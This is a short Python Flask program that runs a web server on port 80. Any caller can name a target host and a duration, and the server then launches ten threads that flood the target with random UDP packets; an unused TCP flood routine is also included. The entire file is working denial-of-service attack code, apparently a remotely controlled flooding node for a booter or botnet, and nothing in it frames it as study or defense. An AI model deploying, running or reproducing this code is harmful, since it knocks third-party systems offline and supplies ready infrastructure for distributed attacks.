from flask import Flask, render_template
from flask import request
import time
import random
import socket
import threading
import datetime
app = Flask(__name__)
@app.route('/')
def index():
  host = request.args.get('host')
  length = request.args.get('length')
  if host == None:
    print("Please fill out the required!");
  else:
  	print(host)
  if length == None:
    print("Please fill out the required!");
  else:
    print(length)
    execute();
  return('{Executer: Online}')

def execute():
  host = request.args.get('host')
  length = request.args.get('length')
  ip = str(host)
  port = int(65335)
  choice = str('y')
  times = int(1000)
  threads = int(10)
  start_time = datetime.datetime.now()
  end_time = start_time + datetime.timedelta(seconds=int(length))
  def run():
    data = random._urandom(1024)
    i = random.choice(("[*]","[!]","[#]"))
    while end_time > datetime.datetime.now():
      try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        addr = (str(ip),int(port))
        for x in range(times):
          s.sendto(data,addr)
        print(i +" Sent!!!")
      except:
        print("[!] Error!!!")

  def run2():
    data = random._urandom(16)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
      try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,port))
        s.send(data)
        for x in range(times):
          s.send(data)
        #print(i +" Sent!!!")
      except:
        s.close()
        #print("[*] Error")

  for y in range(threads):
    if choice == 'y':
      th = threading.Thread(target = run)
      th.start()
    else:
      th = threading.Thread(target = run2)
      th.start()
app.run(host='0.0.0.0', port=80)
